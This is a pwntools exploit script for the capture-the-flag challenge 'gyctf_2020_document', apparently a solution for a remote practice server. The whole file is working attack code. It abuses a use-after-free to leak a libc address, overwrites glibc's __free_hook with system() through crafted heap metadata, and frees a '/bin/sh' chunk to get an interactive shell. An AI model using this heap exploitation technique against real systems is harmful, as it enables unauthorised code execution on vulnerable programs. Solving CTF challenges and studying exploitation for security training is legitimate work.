from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('gyctf_2020_document')
io = remote('node4.buuoj.cn', 28226)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('gyctf_2020_document')


def add(name, info):
    io.sendlineafter('Give me your choice : \n', '1')
    io.sendafter('input name\n', name)
    io.sendafter('input sex\n', 'W')
    io.sendafter('input information\n', info)


def show(index):
    io.sendlineafter('Give me your choice : \n', '2')   
    io.sendlineafter('Give me your index : \n', str(index))
    return io.recvline()[:-1]


def edit(index, info):
    io.sendlineafter('Give me your choice : \n', '3')
    io.sendlineafter('Give me your index : \n', str(index))
    io.sendlineafter('Are you sure change sex?\n', 'N')
    io.sendafter('Now change information\n', info)


def delete(index):
    io.sendlineafter('Give me your choice : \n', '4')
    io.sendlineafter('Give me your index : \n', str(index))


def leak_libc():
    global libc_base
    add(b'namename', cyclic(0x70))          # 0
    add(b'/bin/sh\x00', cyclic(0x70))       # 1
    delete(0)
    libc_base = u64(show(0).ljust(8, b'\x00')) - libc.sym['__malloc_hook'] - 0x68
    log.success('libc_base: ' + hex(libc_base))


def pwn():
    __free_hook = libc_base + libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    add(b'namename', cyclic(0x70))          # 2
    add(b'namename', cyclic(0x70))          # 3
    payload = cyclic(8) + p64(0x21) + p64(__free_hook - 0x10) + p64(1)
    small_bins_0x50 = libc_base + libc.sym['__malloc_hook'] + 0xa8
    payload += cyclic(8) + p64(0x51) + p64(small_bins_0x50) * 2 + cyclic(0x30)
    edit(0, payload)
    payload = p64(system) + p64(0) * 9 + p64(0x80) + p64(0) * 3
    edit(3, payload)
    # gdb.attach(io)
    # pause()
    delete(1)
    io.interactive()


if __name__ == '__main__':
    leak_libc()
    pwn()
